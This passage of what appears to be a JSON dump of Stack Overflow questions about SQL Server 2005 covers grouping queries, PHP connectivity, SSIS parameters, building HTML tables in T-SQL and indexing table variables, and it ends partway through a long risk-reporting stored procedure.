1),\nthread_group NVARCHAR(60), \nnum_batches INTEGER)\n\nCREATE TABLE #t_group_dye\n(group_id   INTEGER, \nstage   INTEGER,\nsequence    INTEGER,\ndye_code    NVARCHAR(10),\ndye_conc    NUMERIC(19,7))\n</code></pre>\n\n<p>Now, my question is: assuming that we have #t_batch and #t_batch_dye populated and that there are a varying number of #t_batch_dye records for each record in #t_batch, how can I insert records into #t_group with a unique group_id for each unique combination of dyes and their concentrations as well as a count of the batches for each group?</p>\n\n<p>Is this something I could use the PIVOT keyword for? The examples I have found on the web all seem to assume that the number of pivoted fields is known in advance.</p>\n\n<p>Many thanks, </p>\n\n<p>David</p>\n\n<p>Glasgow, Scotland</p>\n\n<hr>\n\n<p>Update:</p>\n\n<p>What I have done is to use a function that returns a concatenated string of codes and concs and used that to group the data.</p>\n\n<pre><code>DECLARE @dyes NVARCHAR(2000)  \n\n SELECT @dyes = ISNULL(@dyes,'') + dye_code + ' ' + convert(nvarchar,      requested_dye_conc) + ' '\n FROM   #t_batch_dye\n WHERE  batch_id_fk = @batch_id\n ORDER BY dye_code ASC\n</code></pre>\n"},{"tags":["php","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12740288,"title":"how to connect php 5.4.4 to MSSQL server 2005","body":"<p>Q : How to php 5.4.4 (xampp 1.8.0) to MSSQL Server 2005?</p>\n\n<p>Status : I download SQLSRV30.EXE from <a href=\"http://www.microsoft.com/en-us/download/details.aspx?id=20098\" rel=\"nofollow\">here</a>. And installed .dll files into my php/ext folder. And I setup extension at php.ini. But can't connect to MSSQL server 2005.</p>\n"},{"tags":["sql-server-2005","grouping","aggregate","with-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":4668833,"title":"data cleansing using grouping based on time interval - sql2005","body":"<p>I have the following data in a table that I would like to report on without having to delete any rows.</p>\n\n<p>ActiveSearchID---SearchDate---------------------SearchPhrase<Br>\n1---------------------2010-12-15 12:01:11.587---argos<Br>\n2---------------------2010-12-15 12:03:40.193---muji<Br>\n3---------------------2010-12-15 12:03:42.370---muji<Br>\n4---------------------2010-12-15 12:04:29.167---Office supplies<Br>\n5---------------------2010-12-15 12:05:11.590---lava<Br>\n9---------------------2010-12-15 12:08:38.920---sony vaio<Br>\n10-------------------2010-12-15 12:08:41.170---sony vaio<Br>\n12-------------------2010-12-15 12:09:09.920---sony vaio battery<Br>\n13-------------------2010-12-15 12:09:17.487---sony vaio battery<Br>\n14-------------------2010-12-15 12:17:10.980---sony vaio battery<Br>\n15-------------------2010-12-15 12:17:12.170---argos<Br>\n<Br>\nThe report I am trying to get is to select the first instance of a searchphrase that has been searched on within a 5 minute interval.\nSo for example the query no the information above would result in the following:\n<br>\nSearchDate----------------SearchPhrase<br>\n2010-12-15 12:01:11.587---argos<br>\n2010-12-15 12:03:40.193---muji<br>\n2010-12-15 12:04:29.167---Office supplies<br>\n2010-12-15 12:05:11.590---lava<br>\n2010-12-15 12:08:38.920---sony vaio<br>\n2010-12-15 12:09:09.920---sony vaio battery<Br>\n2010-12-15 12:17:12.170---argos<Br></p>\n\n<p><br></p>\n\n<p>i've tried the following query but i am still getting duplicates:<Br></p>\n\n<p>select t1.searchdate, t1.searchphrase\nfrom activesearches t1\ninner join activesearches t2 on t1.searchphrase = t2.searchphrase \n    and t1.searchdate &lt; t2.searchdate\nwhere datediff(s, t1.searchdate, t2.searchdate) &lt;= 300 \norder by searchdate</p>\n\n<p><br></p>\n\n<p>I would like to use the \"WITH SearchPhrases AS ()\" type of query but I just can't get my head around it.</p>\n\n<p>Thanks</p>\n"},{"tags":["html","string","sql-server-2005","string-concatenation","html-table"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12729929,"title":"How to build an HTML table with subtotals using a recursive string concatenation?","body":"<p>I have the next two tables:</p>\n\n<pre><code>CREATE TABLE #SalesByStore (\n    Brand VARCHAR(10),\n    StoreName VARCHAR(50),\n    Sales DECIMAL(10,2)\n)\n\nCREATE TABLE #SalesByBrand (\n    Brand VARCHAR(10),\n    TotalSales DECIMAL(10,2)\n)\n</code></pre>\n\n<p>I am trying to build an HTML table body using recursive string concatenation, and I need to show the sales by store ordered by brand, and after each group of stores from a same brand show the sales subtotals for that brand, like this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/1jDZP.gif\" alt=\"enter image description here\"></p>\n\n<p>I am doing it the following way:</p>\n\n<pre><code>DECLARE @tableBody NVARCHAR(MAX), @lastBrand VARCHAR(10);\nSELECT @tableBody='';\n\nSELECT\n  @tableBody\n    = @tableBody\n      + CASE\n          WHEN @lastBrand IS NOT NULL AND @lastBrand&lt;&gt;SS.Brand\n            THEN '&lt;tr&gt;&lt;td colspan=\"2\"&gt;Subtotal&lt;/td&gt;&lt;td&gt;'\n                 + (SELECT TOP 1 CAST(SB.TotalSales AS VARCHAR(15)) FROM #SalesByBrand SB WHERE SB.Brand=@lastBrand)\n                 + '&lt;/td&gt;&lt;/tr&gt;'\n            ELSE '' END\n      + '&lt;tr&gt;&lt;td&gt;' + SS.Brand + '&lt;/td&gt;&lt;td&gt;'\n      + SS.StoreName + '&lt;/td&gt;&lt;td&gt;' + CAST(SS.Sales AS VARCHAR(15)) + '&lt;/td&gt;&lt;/tr&gt;',\n  @lastBrand = SS.Brand\nFROM #SalesByStore SS\nORDER BY SS.Brand\n</code></pre>\n\n<p>The problem is that the sub-query that gets me the sub-total amount by brand always returns NULL because @lastBrand remains null for the sub-query (see this stack overflow question for an explain about why this happens: <a href=\"http://stackoverflow.com/questions/12647808/why-subquery-inside-recursive-string-concatenation-always-returns-null\">Why subquery inside recursive string concatenation always returns NULL?</a>).</p>\n\n<p>Can you suggest me another way to create the HTML table with subtotals in SQL Server 2005?</p>\n\n<p>By the way, I need to build the HTML table in SQL Server in order to send it inside a db mail.</p>\n\n<p><strong>EDIT:</strong> I have moved the case from the ending to the beggining of the concatenation, because the subtotal row must be draw before the new brand group begins. Sorry for the mistake.</p>\n"},{"tags":["asp.net","sql-server-2005","visual-studio-2008","gridview"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":11855637,"title":"Fixed Header with autogenerate columns","body":"<p>Is there a way to have fixed Headers with autogenerate columns?  I am against creating the headers manually since we will be using the same gridview for different information.  </p>\n\n<p>Also, is there a way to align a header/row differently from the rest?  Lets say I always want all the rows and header to align center except for the row \"name\".  Is it possible to do an if statement for that?  Or maybe there is an easier way?</p>\n\n<p>I am always open to any ideas of using a different graph also.  So if anyone has any, that would be great suggestions.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12731380,"title":"Programmatically edit SQL in Data Flow task (SSIS 2005)","body":"<p>I need to execute a SELECT query with one variable (in the WHERE clause) from an AS/400 source. I have an OLE DB driver, but it does not seem to support using a ? [error is Exception from HRESULT: 0x80040E10 (Microsoft.SqlServer.SQLTaskConnectionsWrap)]</p>\n\n<p>Obviously, this should be do-able by programmatically editing my SQL (I'm guessing from the Script task), but I'm not sure where in the object model I can find the SQL related to my Data Flow task.</p>\n\n<p>If people have other suggestions entirely, I'm open to that as well, I just need to execute a parameterized query where the value replaces the parameter on the client-side before sending the query over. Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1633,"score":0,"question_id":4645210,"title":"SQL SERVER NON-Clustered Index on table variable?","body":"<p>How can we create non-clustered index on table variable?</p>\n\n<p><strong>Create Table @risk \n(rskid int)</strong></p>\n\n<p><strong>Create nonclustered index r_rskid_nc on @risk(rskid)</strong></p>\n\n<p>It does not work??</p>\n\n<hr>\n\n<h2><strong>My proc</strong></h2>\n\n<p><em><strong>How can i optimize it ??</em></strong></p>\n\n<p>ALTER PROCEDURE [dbo].[SPR_LV004]\n   (\n    @TopN INT\n   ,@LoggedUserId INT\n   ,@Entity VARCHAR(255)\n   ,@OpModel VARCHAR(255)\n   ,@RiskCat VARCHAR(255)\n   ,@RsdlInh VARCHAR(1)\n   ,@DisplayAction VARCHAR(1)\n   ,@LastAssDate DATETIME\n   )\nAS </p>\n\n<pre><code>  SET NOCOUNT ON\n\nDECLARE @Thisdate DATETIME\n\nSET @ThisDate = GETDATE()\n\nDECLARE @MainFilter  TABLE(\n            fcaName VARCHAR(100)\n           ,fctName VARCHAR(100)\n           ,rskId INT PRIMARY KEY CLUSTERED )\n\nDECLARE @Tgt  TABLE(rasRiskId INT\n           ,rasId INT\n           ,RAMName VARCHAR(100)\n           ,RAMColour INT\n           ,RAMImpDesc VARCHAR(100)\n           ,RAMLikDesc VARCHAR(100)\n           ,RAMImpScore INT\n           ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @Inh  TABLE(rasRiskId INT\n           ,rasId INT\n           ,RAMName VARCHAR(100)\n           ,RAMColour INT\n           ,RAMImpDesc VARCHAR(100)\n           ,RAMLikDesc VARCHAR(100)\n           ,RAMImpScore INT\n           ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @Res  TABLE(rasRiskId INT\n            ,rasId INT\n            ,RAMName VARCHAR(100)\n            ,RAMColour INT\n            ,RAMimpDesc VARCHAR(100)\n            ,RAMlikDesc VARCHAR(100)\n            ,RAMImpScore INT\n            ,RAMLikScore INT\n            ,LastScore INT\n            ,AnnualExposure NUMERIC(15, 0)\n            ,Currency VARCHAR(9)\n            ,OverallExp NUMERIC(15,0)\n            ,Frequency INT\n            ,LastAssessmentDate DATETIME)\n\nDECLARE @RiskData  TABLE(RAMScore INT\n           ,AnnExp NUMERIC(15, 0)\n           ,rskId INT\n           ,RiskID VARCHAR(20)\n           ,rskDescription VARCHAR(150)\n           ,LongDesc VARCHAR(4000)\n           ,RiskAssessmentDate VARCHAR(100)\n           ,RAMName VARCHAR(100)\n           ,rskRAMId INT\n           ,rskRiskProfile INT\n           ,EntityInfo VARCHAR(100)\n           ,OwnerName VARCHAR(100)\n           ,NomineeName VARCHAR(100)\n           ,ReviewerName VARCHAR(100)\n            ,TgtRasId INT\n           ,TgtRamName VARCHAR(100)\n           ,TgtRamColour INT\n           ,TgtRamImpDesc VARCHAR(100)\n           ,TgtRamLikDesc VARCHAR(100)\n           ,TgtRamImpScore INT\n           ,TgtRamLikScore INT\n           ,TgtLastScore INT\n           ,TgtAnnualExp Numeric(15,0)\n           ,TgtCurrency VARCHAR(9)\n           ,InhRasId INT\n           ,InhRamName VARCHAR(100)\n           ,InhRamColour INT\n           ,InhRamImpDesc VARCHAR(100)\n           ,InhRamLikDesc VARCHAR(100)\n           ,InhRamImpScore INT\n           ,InhRamLikScore INT\n           ,InhLastScore INT\n           ,InhAnnualExp Numeric(15,0)\n           ,InhCurrency VARCHAR(9)\n           ,RsdRasId INT\n           ,RsdRamName VARCHAR(100)\n           ,RsdRamColour INT\n           ,RsdRamImpDesc VARCHAR(100)\n           ,RsdRamLikDesc VARCHAR(100)\n           ,RsdRamImpScore INT\n           ,RsdRamLikScore INT\n           ,RsdLastScore INT\n           ,rsdAnnualExp Numeric(15,0)\n           ,RsdCurrency VARCHAR(9)\n           ,fcaName VARCHAR(100)\n           ,fctName VARCHAR(100)\n           ,CCRId VARCHAR(15)\n           ,crrDescription VARCHAR(150)\n           ,Assessed char(1)\n           ,Attested Char(1)\n           ,DisplayAction VARCHAR(1)               \n           ,opModelName VARCHAR(255)\n           ,severity NUMERIC(15,0)\n           ,topriskcat VARCHAR(100)\n           ,TgtOverallExp NUMERIC(15,0)\n           ,TgtFrequency INT\n           ,InhOverallExp NUMERIC(15,0)\n           ,InhFrequency INT\n           ,ResOverallExp NUMERIC(15,0)\n           ,ResFrequency INT)\n\n    DECLARE @RiskCtrl  TABLE(\n            rcnRiskId INT\n            ,rcnId INT\n            ,ControlInfo VARCHAR(1100) \n            ,Performance INT --VARCHAR(60)              ,Design INT --VARCHAR(60)\n            ,ControlOwner VARCHAR(100)\n            ,ControlNominee VARCHAR(100)\n            ,ControlReviewer VARCHAR(100))\n\n    DECLARE  @ACTIONS  TABLE(\n            ActionRiskId INT\n           ,ControlID INT\n           ,actTgtCompleteDate VARCHAR(9)\n           ,actTgtODueDate VARCHAR(9)\n           ,RATgtDate VARCHAR(9)\n           ,ActNominee VARCHAR(100)             \n           ,ActOwner VARCHAR(100)      \n           ,ActCompleteAmt INT              \n           ,ActionDetail VARCHAR(MAX)\n           ,AType INT\n           ,ActionState VARCHAR(90) )\n\n    DECLARE  @TopRiskSort  TABLE(\n            RdRecId INT IDENTITY(1,1) NOT NULL\n            ,AnnExp NUMERIC(15, 0)\n            ,rskId INT\n            ,severity NUMERIC(15,0)\n            )\n\n\n    DECLARE  @TopRisk  TABLE(\n            AnnExp NUMERIC(15, 0)\n            ,rskId INT\n            ,severity NUMERIC(15,0)\n            )\n\n   -- New tables for LV004 06-JAN-2010\n   -- gets the parent Operational Model -- by priyanka \n    DECLARE @OpModels TABLE(\n            OpModelName VARCHAR(255),\n            rskId INT)\n\n    DECLARE @TopRiskCat TABLE(\n        rskid INT PRIMARY KEY CLUSTERED,\n        topRiskCat VARCHAR(1000))\n\n    --LOCAL VARIABLES \n    DECLARE @Query VARCHAR(8000)\n\n    --Create filter data in a Table datatype\n    INSERT INTO @MainFilter\n    SELECT DISTINCT\n            NULL as fcaName\n           ,NULL as fctName\n           ,R.rskId               \n    FROM     RiskProfiles RP\n    INNER JOIN RiskProfileFactAnal RPF\n    ON       RP.rwkReference = RPF.wfaRiskProfile\n    INNER JOIN FactCatAnal FA\n    ON       RPF.wfaFactAnalId = FA.fcaId\n    INNER JOIN UserViewsEntity UE\n    ON       RPF.wfaRiskProfile = UE.uveEntId\n    INNER JOIN Risks R\n    ON       RP.rwkReference = R.rskRiskProfile\n    INNER JOIN RiskAnalysis RA\n    ON       R.rskId = RA.ranRiskId\n    INNER JOIN RiskCategory RC\n    ON       RA.ranRiskAnalId = RC.rctId\n    LEFT OUTER JOIN RiskAssessment RASS\n    ON       R.rskId = RASS.rasRiskId      \n            AND R.rskRelevant = 'Y'\n    WHERE    (UE.uveUserId = @LoggedUserId)                     \n            --AND FA.fcaId in (SELECT FinalID FROM @FinalTree)\n            AND FA.fcaId in (SELECT TreeTableID FROM [dbo].[OpModelListToTable](@OpModel))              AND RP.rwkReference in (SELECT TreeTableID FROM [dbo].[EntityListToTable](@Entity))\n            AND RC.rctid in (SELECT TreeTableID FROM [dbo].[RiskCategoryListToTable](@RiskCat))\n            AND R.rskOpendate &lt;= @LastAssDate\n  -- Insertion into new tables\n   INSERT INTO @OpModels \n     SELECT  FCA.fcaName AS TopLevelBusinessLine,\n                    Rsk.rskid\n     FROM @MainFilter MF \n             INNER JOIN Risks RSK \n                    ON  RSK.rskid= MF.rskId   \n             INNER JOIN  RiskProfileFactAnal RPF\n                    ON RPF.wfaRISkProfile = RSK.rskRiskProfile\n             INNER JOIN FactCatAnal FCA \n                    ON FCA.fcaId = RPF.wfaFactAnalId \n             INNER JOIN FactCategory  FC\n                    ON FC.fctid = FCA.fcaCategory and FC.fctName='Business Unit'                                \n\n  INSERT INTO @TopRiskCat\n        SELECT R.rskid\n              ,dbo.fn_GetTopParentRiskCategoryScalar(RC.rctId) as TopLevelRiskCat\n        FROM @MainFilter MF \n        INNER JOIN  RISKS R \n            ON  R.rskid= MF.rskId   \n        INNER JOIN RiskAnalysis RA\n            ON R.rskId = RA.ranRiskId\n        INNER JOIN RiskCategory as RC\n            ON RA.ranRiskAnalId = RC.rctId\n\n\n    -- Target Data\n    INSERT   INTO @Tgt\n    SELECT TgtRskID,rasId,ramaltName,ramaltColour,TgtRAMDescr,TgtRAMLikDescr,TgtRAMImpScr,TgtRAMLikScr\n,LastScore  , AnnualExposure,curCode, TgtOverallExp,TgtFrequency,RiskLastAssessment FROM (\n    SELECT \n          RA.rasRiskId AS TgtRskID\n         ,RA.rasId \n         ,RM.ramaltName\n         ,RM.ramaltColour \n         ,isnull(RI.ramimpDescription,'') AS TgtRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS TgtRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS TgtRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS TgtRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'I'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode \n        ,RA.rasExposure as TgtOverallExp\n        ,RA.rasRAMLikFreqEntered as TgtFrequency\n        ,RA.rasAssessmentDate as RiskLastAssessment         \n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'T') )\n    A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.TgtRskID = B.rasRiskid\n\n\n    --Inherent data\n    INSERT INTO @Inh\n\n    SELECT InhRskID,rasId,ramaltName,ramaltColour,InhRAMDescr,InhRAMLikDescr,InhRAMImpScr,InhRAMLikScr,LastScore,AnnualExposure,curCode,\n            InhOverallExp,InhFrequency,RiskLastAssessment FROM (\n    SELECT RA.rasRiskId AS InhRskID\n         ,RA.rasId\n         ,RM.ramaltName\n         ,RM.ramaltColour\n         ,isnull(RI.ramimpDescription,'') AS InhRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS InhRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS InhRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS InhRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'I'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode\n        ,RA.rasExposure as InhOverallExp\n        ,RA.rasRAMLikFreqEntered as InhFrequency \n        ,RA.rasAssessmentDate as RiskLastAssessment\n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'I'))--          AND (RA.rasIsLatest = 'Y')\n    A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.InhRskID = B.rasRiskid\n\n\n    --Residual data\n    INSERT   INTO @Res\n    SELECT ResRskID,rasId,ramaltName,ramaltColour,ResRAMDescr,ResRAMLikDescr,ResRAMImpScr,ResRAMLikScr,LastScore,AnnualExposure,curCode,\n            ResOverallExp,ResFrequency,RiskLastAssessment  FROM(\n    SELECT   RA.rasRiskId AS ResRskID\n         ,RA.rasId\n         ,RM.ramaltName\n         ,RM.ramaltColour\n         ,isnull(RI.ramimpDescription,'') AS ResRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS ResRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS ResRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS ResRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'R'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode \n        ,RA.rasExposure as ResOverallExp\n        ,RA.rasRAMLikFreqEntered as ResFrequency\n        ,RA.rasAssessmentDate as RiskLastAssessment\n\n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'R'))--  AND (RA.rasIsLatest = 'Y')\n     A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.ResRskID = B.rasRiskid  \n\n    -- Risk Data to display on report   \n    INSERT   INTO @RiskData\n    SELECT   RA.rasRAMImpactScore * RA.rasRAMLikelihoodScore AS RAMScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnExp -- Required for sorting.\n        ,RSK.rskId\n        ,dbo.RiskPrefixId(RSK.rskId) AS RiskID\n        ,isnull(RSK.rskDescription,'')\n        ,isnull(SUBSTRING(RSK.rskLongDesc, 1, 4000),'') AS LongDesc\n        ,CASE WHEN YEAR(RSK.rskAssNext) &lt;= 1900\n            THEN NULL \n            ELSE CONVERT(VARCHAR(9), RSK.rskAssNext, 6) \n         END as RiskAssessmentDate\n        ,RAM.RAMName\n        ,RSK.rskRAMId\n        ,RSK.rskRiskProfile\n        ,RP.rwkDesc + ': ' + dbo.EntityPrefixId(RSK.rskRiskProfile) AS EntityInfo\n        ,isnull(dbo.FULLNAME(RSK.rskOwner),'...') AS OwnerName\n        ,isnull(dbo.FULLNAME(RSK.rskNomineeId),'...') AS NomineeName\n        ,isnull(dbo.FULLNAME(RSK.rskReviewer),'...') AS ReviewerName\n        ,T.rasId AS TgtRasId\n        ,T.RAMName AS TgtRamName\n        ,T.RAMColour AS  TgtRamColour\n        ,T.RAMImpDesc AS TgtRamImpDesc\n        ,T.RAMLikDesc AS TgtRamLikDesc\n        ,isnull(T.RAMImpScore,0) AS TgtRamImpScore\n        ,isnull(T.RAMLikScore,0) AS TgtRamLikScore\n        ,isnull(T.LastScore,0) AS TgtLastScore      \n        ,isnull(T.AnnualExposure,0.00) AS TgtAnnualExp\n        ,T.Currency as TgtCurrency\n        ,I.rasId AS InhRasId\n        ,I.RAMName AS InhRamName\n        ,I.RAMColour AS InhRamColour\n        ,I.RAMImpDesc AS InhRamImpDesc\n        ,I.RAMLikDesc AS InhRamLikDesc\n        ,isnull(I.RAMImpScore,0) AS InhRamImpScore\n        ,isnull(I.RAMLikScore,0) AS InhRamLikScore\n        ,isnull(I.LastScore,0) AS InhLastScore\n        ,isnull(I.AnnualExposure,0.00) AS InhAnnualExp\n        ,I.Currency as InhCurrency\n        ,R.rasId AS RsdRasId\n        ,R.RAMName AS RsdRamName\n        ,R.RAMColour AS RsdRamColour\n        ,R.RAMimpDesc AS RsdRamImpDesc\n        ,R.RAMlikDesc AS RsdRamLikDesc\n        ,isnull(R.RAMImpScore,0) AS RsdRamImpScore\n        ,isnull(R.RAMLikScore,0) AS RsdRamLikScore\n        ,isnull(R.LastScore,0) AS RsdLastScore\n        ,isnull(R.AnnualExposure,0.00) AS RsdAnnualExp\n        ,R.Currency as RsdCurrency\n        ,MF.fcaName\n        ,MF.fctName\n        ,dbo.CRRPrefixId(CRR.CrrId) AS CCRId\n        ,isnull(CRR.crrDescription,'') \n        ,CASE WHEN ISNULL(RA.rasid,0) = 0 THEN 'N' Else 'Y' END AS Assessed \n        ,CASE WHEN UPPER((RA.rasstatus)) = 'A' THEN 'Y' ELSE 'N' END AS Attested    \n        ,@DisplayAction         \n        ,OP.OpModelName as TopLevelOpModel\n        ,RSK.rskSeverity as RiskSeverity\n        ,TRC.topRiskCat as TopLevelRiskCat\n        ,Isnull(T.OverallExp/1000,0) as TgtOverallExp\n        ,Isnull(T.Frequency,0) as TgtFrequency\n        ,IsNUll(I.OverallExp/1000,0) as InhOverallExp\n        ,ISNUll(I.Frequency,0) as InhFrequency \n        ,IsNUll(R.OverallExp/1000,0) as ResOverallExp\n        ,Isnull(R.Frequency,0) as ResFrequency              \n    FROM     Risks RSK\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = RSK.rskId\n    INNER JOIN RiskProfiles RP\n    ON       RSK.rskRiskProfile = RP.rwkReference\n    INNER JOIN RAM\n    ON       RP.rwkRAMID = RAM.ramId\n    LEFT OUTER JOIN CentralRiskRegister CRR\n    ON       CRR.crrId = RSK.rskCRRId   -- Added on 03/Jan/08\n    LEFT OUTER JOIN RiskAssessment RA\n    ON       RSK.rskId = RA.rasRiskId\n     AND RA.rasIsLatest = 'Y'\n      AND RA.rasType = CASE WHEN @RsdlInh = '1'  THEN 'R'\n                            WHEN @RsdlInh = '2'  THEN 'I'\n                            ELSE 'T'\n                       END\n    LEFT OUTER JOIN @Tgt T\n    ON       RSK.rskId = T.rasRiskId\n    LEFT OUTER JOIN @Inh I\n    ON       RSK.rskId = I.rasRiskId\n    LEFT OUTER JOIN @Res R\n    ON       RSK.rskId = R.rasRiskId\n    LEFT OUTER JOIN @OpModels OP\n    ON      RSK.rskId = OP.rskid\n    LEFT OUTER JOIN @TopRiskCat TRC\n    ON      RSk.rskid = TRC.rskid       \n    WHERE    RSK.rskRelevant = 'Y'\n\n\n-- Get Risk data in descending order of Severity\n    INSERT INTO @TopRiskSort\n    select distinct AnnExp,rskId,severity\n    FROM @RiskData\n    Order BY Severity desc;\n    --Order BY AnnExp desc;\n\n    --If @TopN values is 0 take all the recods\n    IF @TopN = 0 \n    BEGIN\n        INSERT INTO @TopRisk\n        select   AnnExp\n                ,rskId\n                ,severity\n        from @TopRiskSort \n    END\n    ELSE\n    BEGIN   -- Else \n        INSERT INTO @TopRisk\n        select   AnnExp\n                ,rskId\n                ,severity \n        from @TopRiskSort\n        where RdRecId &lt;= @topn;\n    END\n\n\n    --Controls for the above Risks\n    INSERT INTO @RiskCtrl\n    SELECT RD.rskId\n        ,RC.rcnId\n        ,dbo.RiskControlPrefixId(RC.rcnId) + ':' + rcnShortDescr AS ControlInfo\n        ,(SELECT efid FROM Effectiveness WHERE efId = CA.rcaEffectiveness) AS Performance --ACCR-1327\n        ,(SELECT adid FROM Adequacy WHERE adId = CA.rcaAdequacy) AS Design          ,dbo.FULLNAME(RC.rcnOwnerId) AS ControlOwner\n        ,dbo.FULLNAME(RC.rcnNomineeId) AS ControlNominee\n        ,dbo.FULLNAME(RC.rcnReviewerId) AS ControlReviewer\n    FROM @TopRisk TR        \n        LEFT OUTER JOIN @RiskData RD ON RD.rskId=TR.rskId\n        LEFT OUTER JOIN RiskControls RC ON RC.rcnRiskId = RD.rskId\n        LEFT OUTER JOIN RiskCtrlAss CA ON RC.rcnId = CA.rcaRiskCtrlId\n    WHERE (ISNULL(CA.rcaId, 0) = (SELECT IsNull(MAX(RA.rcaId), 0) FROM RiskCtrlAss RA \n                                    WHERE RA.rcaRiskCtrlId = RC.rcnId))\n\n\n    --Risk and Risk Controls Actions\n    INSERT INTO @ACTIONS\n    -- Risk Actions fro all the risks in @RiskData table\n    SELECT A.actOwningId AS ActionRiskId\n        ,NULL AS ControlID\n        ,CASE WHEN 